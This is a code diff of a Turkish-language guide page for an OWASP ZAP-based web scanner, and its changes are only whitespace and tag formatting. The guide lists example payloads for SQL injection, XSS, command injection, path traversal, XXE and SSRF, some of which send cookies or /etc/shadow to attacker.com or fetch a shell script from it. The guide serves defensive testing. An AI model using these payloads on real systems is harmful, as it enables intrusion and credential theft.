@@ -78,7 +78,7 @@ const ApplicationGuide: React.FC = () => {
           </Box>
         </Box>
         <Typography variant="body1" sx={{ color: 'rgba(255,255,255,0.95)', mt: 2 }}>
-          Bu platform, OWASP ZAP tabanlı gelişmiş güvenlik tarama yetenekleri sunar. 
+          Bu platform, OWASP ZAP tabanlı gelişmiş güvenlik tarama yetenekleri sunar.
           Web uygulamalarınızı 20+ farklı saldırı türüne karşı test edin ve güvenlik açıklarını tespit edin.
         </Typography>
       </Paper>
@@ -101,7 +101,7 @@ const ApplicationGuide: React.FC = () => {
           <Divider sx={{ mb: 3 }} />
 
           <Alert severity="info" sx={{ mb: 3 }}>
-            <strong>3 Adımda Güvenlik Taraması:</strong> Platform kullanımı son derece basittir. 
+            <strong>3 Adımda Güvenlik Taraması:</strong> Platform kullanımı son derece basittir.
             Ortam seçin, hedef URL girin ve taramayı başlatın!
           </Alert>
 
@@ -119,22 +119,22 @@ const ApplicationGuide: React.FC = () => {
                   <List dense>
                     <ListItem>
                       <ListItemIcon><CheckCircleIcon color="success" fontSize="small" /></ListItemIcon>
-                      <ListItemText 
-                        primary="🧪 TEST/STAGING" 
+                      <ListItemText
+                        primary="🧪 TEST/STAGING"
                         secondary="Kapsamlı test (Maksimum agresiflik)"
                       />
                     </ListItem>
                     <ListItem>
                       <ListItemIcon><CheckCircleIcon color="success" fontSize="small" /></ListItemIcon>
-                      <ListItemText 
-                        primary="🔒 PRODUCTION" 
+                      <ListItemText
+                        primary="🔒 PRODUCTION"
                         secondary="Güvenli tarama (Sadece okuma)"
                       />
                     </ListItem>
                     <ListItem>
                       <ListItemIcon><CheckCircleIcon color="success" fontSize="small" /></ListItemIcon>
-                      <ListItemText 
-                        primary="⚙️ CUSTOM" 
+                      <ListItemText
+                        primary="⚙️ CUSTOM"
                         secondary="Özel ayarlar (Detaylı kontrol)"
                       />
                     </ListItem>
@@ -156,22 +156,22 @@ const ApplicationGuide: React.FC = () => {
                   <List dense>
                     <ListItem>
                       <ListItemIcon><HttpIcon color="primary" fontSize="small" /></ListItemIcon>
-                      <ListItemText 
-                        primary="Target URL" 
+                      <ListItemText
+                        primary="Target URL"
                         secondary="Ana URL'yi girin (https://example.com)"
                       />
                     </ListItem>
                     <ListItem>
                       <ListItemIcon><CodeIcon color="primary" fontSize="small" /></ListItemIcon>
-                      <ListItemText 
-                        primary="Scan Name" 
+                      <ListItemText
+                        primary="Scan Name"
                         secondary="Taramaya özel isim verin (opsiyonel)"
                       />
                     </ListItem>
                     <ListItem>
                       <ListItemIcon><VpnLockIcon color="primary" fontSize="small" /></ListItemIcon>
-                      <ListItemText 
-                        primary="Context" 
+                      <ListItemText
+                        primary="Context"
                         secondary="Tarama kapsamını belirleyin"
                       />
                     </ListItem>
@@ -193,22 +193,22 @@ const ApplicationGuide: React.FC = () => {
                   <List dense>
                     <ListItem>
                       <ListItemIcon><RocketLaunchIcon color="success" fontSize="small" /></ListItemIcon>
-                      <ListItemText 
-                        primary="Başlat" 
+                      <ListItemText
+                        primary="Başlat"
                         secondary="Otomatik tarama başlar"
                       />
                     </ListItem>
                     <ListItem>
                       <ListItemIcon><SpeedIcon color="info" fontSize="small" /></ListItemIcon>
-                      <ListItemText 
-                        primary="İzle" 
+                      <ListItemText
+                        primary="İzle"
                         secondary="Gerçek zamanlı ilerleme takibi"
                       />
                     </ListItem>
                     <ListItem>
                       <ListItemIcon><SecurityIcon color="error" fontSize="small" /></ListItemIcon>
-                      <ListItemText 
-                        primary="Analiz Et" 
+                      <ListItemText
+                        primary="Analiz Et"
                         secondary="Detaylı rapor ve öneriler"
                       />
                     </ListItem>
@@ -257,10 +257,10 @@ const ApplicationGuide: React.FC = () => {
                 <strong>Örnek Payloadlar:</strong>
               </Typography>
               <Paper sx={{ p: 2, bgcolor: '#1e1e1e', color: 'white', fontFamily: 'monospace', fontSize: '0.85rem' }}>
-                ' OR '1'='1<br/>
-                1' UNION SELECT NULL,NULL,NULL--<br/>
-                1' AND 1=1 AND '1'='1<br/>
-                1' WAITFOR DELAY '0:0:5'--<br/>
+                ' OR '1'='1<br />
+                1' UNION SELECT NULL,NULL,NULL--<br />
+                1' AND 1=1 AND '1'='1<br />
+                1' WAITFOR DELAY '0:0:5'--<br />
                 ' OR 1=1 DROP TABLE users--
               </Paper>
               <Alert severity="info" sx={{ mt: 2 }}>
@@ -296,10 +296,10 @@ const ApplicationGuide: React.FC = () => {
                 <strong>Örnek Payloadlar:</strong>
               </Typography>
               <Paper sx={{ p: 2, bgcolor: '#1e1e1e', color: 'white', fontFamily: 'monospace', fontSize: '0.85rem' }}>
-                {'<script>alert(document.cookie)</script>'}<br/>
-                {'<img src=x onerror=alert(1)>'}<br/>
-                {'<svg onload=alert(1)>'}<br/>
-                {'<iframe src="javascript:alert(1)">'}<br/>
+                {'<script>alert(document.cookie)</script>'}<br />
+                {'<img src=x onerror=alert(1)>'}<br />
+                {'<svg onload=alert(1)>'}<br />
+                {'<iframe src="javascript:alert(1)">'}<br />
                 {'\"><script>fetch(\'https://attacker.com/?c=\'+document.cookie)</script>'}
               </Paper>
               <Alert severity="info" sx={{ mt: 2 }}>
@@ -332,10 +332,10 @@ const ApplicationGuide: React.FC = () => {
                 <ListItem>• Out-of-band Command Injection</ListItem>
               </List>
               <Paper sx={{ p: 2, bgcolor: '#1e1e1e', color: 'white', fontFamily: 'monospace', fontSize: '0.85rem' }}>
-                ; cat /etc/passwd<br/>
-                | whoami<br/>
-                && ping -c 10 attacker.com<br/>
-                `wget http://attacker.com/shell.sh`<br/>
+                ; cat /etc/passwd<br />
+                | whoami<br />
+                && ping -c 10 attacker.com<br />
+                `wget http://attacker.com/shell.sh`<br />
                 $(curl http://attacker.com/?data=$(cat /etc/shadow))
               </Paper>
             </AccordionDetails>
@@ -362,10 +362,10 @@ const ApplicationGuide: React.FC = () => {
                 <ListItem>• Null Byte Injection (%00)</ListItem>
               </List>
               <Paper sx={{ p: 2, bgcolor: '#1e1e1e', color: 'white', fontFamily: 'monospace', fontSize: '0.85rem' }}>
-                ../../../etc/passwd<br/>
-                ....//....//....//etc/passwd<br/>
-                /etc/passwd<br/>
-                ..%2F..%2F..%2Fetc%2Fpasswd<br/>
+                ../../../etc/passwd<br />
+                ....//....//....//etc/passwd<br />
+                /etc/passwd<br />
+                ..%2F..%2F..%2Fetc%2Fpasswd<br />
                 ../../../../../../windows/system32/drivers/etc/hosts
               </Paper>
             </AccordionDetails>
@@ -392,8 +392,8 @@ const ApplicationGuide: React.FC = () => {
                 <ListItem>• Parameter Entity XXE</ListItem>
               </List>
               <Paper sx={{ p: 2, bgcolor: '#1e1e1e', color: 'white', fontFamily: 'monospace', fontSize: '0.85rem' }}>
-                {'<?xml version="1.0"?>'}<br/>
-                {'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'}<br/>
+                {'<?xml version="1.0"?>'}<br />
+                {'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'}<br />
                 {'<root>&xxe;</root>'}
               </Paper>
             </AccordionDetails>
@@ -443,10 +443,10 @@ const ApplicationGuide: React.FC = () => {
                 <ListItem>• Protocol Smuggling (file://, gopher://, etc.)</ListItem>
               </List>
               <Paper sx={{ p: 2, bgcolor: '#1e1e1e', color: 'white', fontFamily: 'monospace', fontSize: '0.85rem' }}>
-                http://localhost:80<br/>
-                http://127.0.0.1:6379<br/>
-                http://169.254.169.254/latest/meta-data/<br/>
-                file:///etc/passwd<br/>
+                http://localhost:80<br />
+                http://127.0.0.1:6379<br />
+                http://169.254.169.254/latest/meta-data/<br />
+                file:///etc/passwd<br />
                 gopher://127.0.0.1:6379/_INFO
               </Paper>
             </AccordionDetails>
@@ -531,9 +531,9 @@ const ApplicationGuide: React.FC = () => {
                       <Chip label="Maksimum Agresiflik" color="error" size="small" />
                     </Box>
                   </Box>
-                  
+
                   <Alert severity="warning" sx={{ mb: 2 }}>
-                    <strong>⚠️ UYARI:</strong> Bu mod sadece test ve staging ortamları için kullanılmalıdır! 
+                    <strong>⚠️ UYARI:</strong> Bu mod sadece test ve staging ortamları için kullanılmalıdır!
                     Canlı sistemlerde kullanmayın.
                   </Alert>
 
@@ -547,57 +547,57 @@ const ApplicationGuide: React.FC = () => {
                   <List dense>
                     <ListItem>
                       <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
-                      <ListItemText 
-                        primary="Unlimited Spider Crawling" 
+                      <ListItemText
+                        primary="Unlimited Spider Crawling"
                         secondary="Sınırsız derinlik ve URL keşfi (maxChildren=0, maxDepth=0)"
                       />
                     </ListItem>
                     <ListItem>
                       <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
-                      <ListItemText 
-                        primary="AJAX Spider (Deep Crawling)" 
+                      <ListItemText
+                        primary="AJAX Spider (Deep Crawling)"
                         secondary="JavaScript tabanlı uygulamalar için 10 seviye derinlik"
                       />
                     </ListItem>
                     <ListItem>
                       <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
-                      <ListItemText 
-                        primary="Active Scan - INSANE Mode" 
+                      <ListItemText
+                        primary="Active Scan - INSANE Mode"
                         secondary="En agresif tarama modu, tüm kurallar aktif"
                       />
                     </ListItem>
                     <ListItem>
                       <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
-                      <ListItemText 
-                        primary="20+ Saldırı Türü" 
+                      <ListItemText
+                        primary="20+ Saldırı Türü"
                         secondary="SQL Injection, XSS, Command Injection, CSRF, SSRF, XXE, vb."
                       />
                     </ListItem>
                     <ListItem>
                       <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
-                      <ListItemText 
-                        primary="WAF Bypass & Advanced Payloads" 
+                      <ListItemText
+                        primary="WAF Bypass & Advanced Payloads"
                         secondary="Firewall atlatma teknikleri ve karmaşık payloadlar"
                       />
                     </ListItem>
                     <ListItem>
                       <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
-                      <ListItemText 
-                        primary="Fuzzing & Brute Force" 
+                      <ListItemText
+                        primary="Fuzzing & Brute Force"
                         secondary="Otomatik parametre fuzzing ve brute force testleri"
                       />
                     </ListItem>
                     <ListItem>
                       <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
-                      <ListItemText 
-                        primary="API Deep Dive & GraphQL Testing" 
+                      <ListItemText
+                        primary="API Deep Dive & GraphQL Testing"
                         secondary="API endpoint analizi ve GraphQL güvenlik testleri"
                       />
                     </ListItem>
                     <ListItem>
                       <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
-                      <ListItemText 
-                        primary="JavaScript Security Analysis" 
+                      <ListItemText
+                        primary="JavaScript Security Analysis"
                         secondary="Client-side güvenlik analizi ve kütüphane taraması"
                       />
                     </ListItem>
@@ -645,9 +645,9 @@ const ApplicationGuide: React.FC = () => {
                       <Chip label="Güvenli Mod - Sadece Okuma" color="success" size="small" />
                     </Box>
                   </Box>
-                  
+
                   <Alert severity="success" sx={{ mb: 2 }}>
-                    <strong>✅ GÜVENLİ:</strong> Canlı sistemler için özel olarak tasarlanmıştır. 
+                    <strong>✅ GÜVENLİ:</strong> Canlı sistemler için özel olarak tasarlanmıştır.
                     Veri tabanına yazma yapmaz, sadece pasif testler yapar.
                   </Alert>
 
@@ -661,29 +661,29 @@ const ApplicationGuide: React.FC = () => {
                   <List dense>
                     <ListItem>
                       <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
-                      <ListItemText 
-                        primary="Limited Spider (Safe Crawling)" 
+                      <ListItemText
+                        primary="Limited Spider (Safe Crawling)"
                         secondary="Sınırlı derinlik (maxChildren=50, maxDepth=5, 30 min)"
                       />
                     </ListItem>
                     <ListItem>
                       <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
-                      <ListItemText 
-                        primary="Passive Scanning Only" 
+                      <ListItemText
+                        primary="Passive Scanning Only"
                         secondary="Sadece trafik analizi, saldırı testleri YOK"
                       />
                     </ListItem>
                     <ListItem>
                       <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
-                      <ListItemText 
-                        primary="Technology Detection" 
+                      <ListItemText
+                        primary="Technology Detection"
                         secondary="Kullanılan teknolojilerin tespiti"
                       />
                     </ListItem>
                     <ListItem>
                       <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
-                      <ListItemText 
-                        primary="JavaScript Library Analysis" 
+                      <ListItemText
+                        primary="JavaScript Library Analysis"
                         secondary="Güvenli JS kütüphane analizi"
                       />
                     </ListItem>
@@ -695,24 +695,24 @@ const ApplicationGuide: React.FC = () => {
                   <List dense>
                     <ListItem>
                       <ListItemIcon><WarningIcon color="disabled" /></ListItemIcon>
-                      <ListItemText 
-                        primary="Active Scanning" 
+                      <ListItemText
+                        primary="Active Scanning"
                         secondary="Tüm aktif saldırı testleri kapalı"
                         sx={{ textDecoration: 'line-through', opacity: 0.6 }}
                       />
                     </ListItem>
                     <ListItem>
                       <ListItemIcon><WarningIcon color="disabled" /></ListItemIcon>
-                      <ListItemText 
-                        primary="Form Submission" 
+                      <ListItemText
+                        primary="Form Submission"
                         secondary="Formlar gönderilmez, sadece analiz edilir"
                         sx={{ textDecoration: 'line-through', opacity: 0.6 }}
                       />
                     </ListItem>
                     <ListItem>
                       <ListItemIcon><WarningIcon color="disabled" /></ListItemIcon>
-                      <ListItemText 
-                        primary="Attack Payloads" 
+                      <ListItemText
+                        primary="Attack Payloads"
                         secondary="Hiçbir saldırı payload'u gönderilmez"
                         sx={{ textDecoration: 'line-through', opacity: 0.6 }}
                       />
@@ -761,7 +761,7 @@ const ApplicationGuide: React.FC = () => {
                       <Chip label="Detaylı Kontrol" color="warning" size="small" />
                     </Box>
                   </Box>
-                  
+
                   <Typography variant="body2" paragraph>
                     <strong>Amaç:</strong> Her bir özelliği ayrı ayrı kontrol edebilme esnekliği.
                   </Typography>
@@ -771,45 +771,45 @@ const ApplicationGuide: React.FC = () => {
                   </Typography>
                   <List dense>
                     <ListItem>
-                      <ListItemText 
-                        primary="Spider Configuration" 
+                      <ListItemText
+                        primary="Spider Configuration"
                         secondary="maxChildren, maxDepth, maxDuration, recurse ayarları"
                       />
                     </ListItem>
                     <ListItem>
-                      <ListItemText 
-                        primary="AJAX Spider Settings" 
+                      <ListItemText
+                        primary="AJAX Spider Settings"
                         secondary="Browser seçimi, crawl depth, duration kontrolü"
                       />
                     </ListItem>
                     <ListItem>
-                      <ListItemText 
-                        primary="Active Scan Intensity" 
+                      <ListItemText
+                        primary="Active Scan Intensity"
                         secondary="LOW, MEDIUM, HIGH, INSANE seviyeleri"
                       />
                     </ListItem>
                     <ListItem>
-                      <ListItemText 
-                        primary="Individual Attack Tests" 
+                      <ListItemText
+                        primary="Individual Attack Tests"
                         secondary="Her saldırı türünü ayrı ayrı aktif/pasif yapma"
                       />
                     </ListItem>
                     <ListItem>
-                      <ListItemText 
-                        primary="Advanced Features" 
+                      <ListItemText
+                        primary="Advanced Features"
                         secondary="JS Security, API Deep Dive, Fuzzing, Custom Payloads"
                       />
                     </ListItem>
                     <ListItem>
-                      <ListItemText 
-                        primary="URL Filters" 
+                      <ListItemText
+                        primary="URL Filters"
                         secondary="Include/Exclude URL patterns, parameter filtering"
                       />
                     </ListItem>
                   </List>
 
                   <Alert severity="info" sx={{ mt: 2 }}>
-                    <strong>💡 İpucu:</strong> Belirli bir zafiyet türünü test etmek istiyorsanız, 
+                    <strong>💡 İpucu:</strong> Belirli bir zafiyet türünü test etmek istiyorsanız,
                     CUSTOM mode kullanarak sadece o test grubunu aktif edebilirsiniz.
                   </Alert>
                 </CardContent>
@@ -887,36 +887,36 @@ const ApplicationGuide: React.FC = () => {
                   <List dense>
                     <ListItem>
                       <ListItemIcon><SecurityIcon color="primary" fontSize="small" /></ListItemIcon>
-                      <ListItemText 
-                        primary="PCI DSS" 
+                      <ListItemText
+                        primary="PCI DSS"
                         secondary="Payment Card Industry Data Security Standard"
                       />
                     </ListItem>
                     <ListItem>
                       <ListItemIcon><SecurityIcon color="primary" fontSize="small" /></ListItemIcon>
-                      <ListItemText 
-                        primary="GDPR" 
+                      <ListItemText
+                        primary="GDPR"
                         secondary="General Data Protection Regulation"
                       />
                     </ListItem>
                     <ListItem>
                       <ListItemIcon><SecurityIcon color="primary" fontSize="small" /></ListItemIcon>
-                      <ListItemText 
-                        primary="ISO 27001" 
+                      <ListItemText
+                        primary="ISO 27001"
                         secondary="Information Security Management"
                       />
                     </ListItem>
                     <ListItem>
                       <ListItemIcon><SecurityIcon color="primary" fontSize="small" /></ListItemIcon>
-                      <ListItemText 
-                        primary="NIST" 
+                      <ListItemText
+                        primary="NIST"
                         secondary="National Institute of Standards"
                       />
                     </ListItem>
                     <ListItem>
                       <ListItemIcon><SecurityIcon color="primary" fontSize="small" /></ListItemIcon>
-                      <ListItemText 
-                        primary="KVKK" 
+                      <ListItemText
+                        primary="KVKK"
                         secondary="Kişisel Verilerin Korunması Kanunu"
                       />
                     </ListItem>
@@ -942,29 +942,29 @@ const ApplicationGuide: React.FC = () => {
               <List>
                 <ListItem>
                   <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
-                  <ListItemText 
-                    primary="Test Ortamında Başlayın" 
+                  <ListItemText
+                    primary="Test Ortamında Başlayın"
                     secondary="İlk taramalarınızı mutlaka test/staging ortamında yapın"
                   />
                 </ListItem>
                 <ListItem>
                   <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
-                  <ListItemText 
-                    primary="Düzenli Tarama Yapın" 
+                  <ListItemText
+                    primary="Düzenli Tarama Yapın"
                     secondary="Haftalık veya her deployment sonrası güvenlik taraması"
                   />
                 </ListItem>
                 <ListItem>
                   <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
-                  <ListItemText 
-                    primary="Raporları Kaydedin" 
+                  <ListItemText
+                    primary="Raporları Kaydedin"
                     secondary="Tüm tarama raporlarını arşivleyin ve karşılaştırın"
                   />
                 </ListItem>
                 <ListItem>
                   <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
-                  <ListItemText 
-                    primary="Kritik Bulguları Önceliklendirin" 
+                  <ListItemText
+                    primary="Kritik Bulguları Önceliklendirin"
                     secondary="CRITICAL ve HIGH seviyedeki zafiyetleri ilk önce düzeltin"
                   />
                 </ListItem>
@@ -978,22 +978,22 @@ const ApplicationGuide: React.FC = () => {
               <List>
                 <ListItem>
                   <ListItemIcon><WarningIcon color="error" /></ListItemIcon>
-                  <ListItemText 
-                    primary="Canlı Sistemde TEST/STAGING Modu Kullanmayın" 
+                  <ListItemText
+                    primary="Canlı Sistemde TEST/STAGING Modu Kullanmayın"
                     secondary="Production sistemlerde sadece PRODUCTION modu kullanın"
                   />
                 </ListItem>
                 <ListItem>
                   <ListItemIcon><WarningIcon color="error" /></ListItemIcon>
-                  <ListItemText 
-                    primary="İzinsiz Tarama Yapmayın" 
+                  <ListItemText
+                    primary="İzinsiz Tarama Yapmayın"
                     secondary="Sadece sahip olduğunuz veya izin aldığınız sistemleri tarayın"
                   />
                 </ListItem>
                 <ListItem>
                   <ListItemIcon><WarningIcon color="error" /></ListItemIcon>
-                  <ListItemText 
-                    primary="Taramayı Peak Saatlerde Başlatmayın" 
+                  <ListItemText
+                    primary="Taramayı Peak Saatlerde Başlatmayın"
                     secondary="Yüksek trafik saatlerinde tarama yapmaktan kaçının"
                   />
                 </ListItem>
@@ -1006,8 +1006,8 @@ const ApplicationGuide: React.FC = () => {
       {/* Footer */}
       <Paper elevation={2} sx={{ p: 3, mt: 3, bgcolor: '#2a2a2a', color: 'white' }}>
         <Typography variant="body2" sx={{ color: 'white' }} align="center">
-          <strong>📞 Destek:</strong> Sorularınız için teknik ekiple iletişime geçin. <br/>
-          <strong>🔒 Gizlilik:</strong> Tüm tarama verileri şifreli olarak saklanır ve 3. taraflarla paylaşılmaz.<br/>
+          <strong>📞 Destek:</strong> Sorularınız için teknik ekiple iletişime geçin. <br />
+          <strong>🔒 Gizlilik:</strong> Tüm tarama verileri şifreli olarak saklanır ve 3. taraflarla paylaşılmaz.<br />
           <strong>⚖️ Yasal Uyarı:</strong> Bu platform sadece yasal ve izin verilmiş güvenlik testleri için kullanılmalıdır.
         </Typography>
       </Paper>
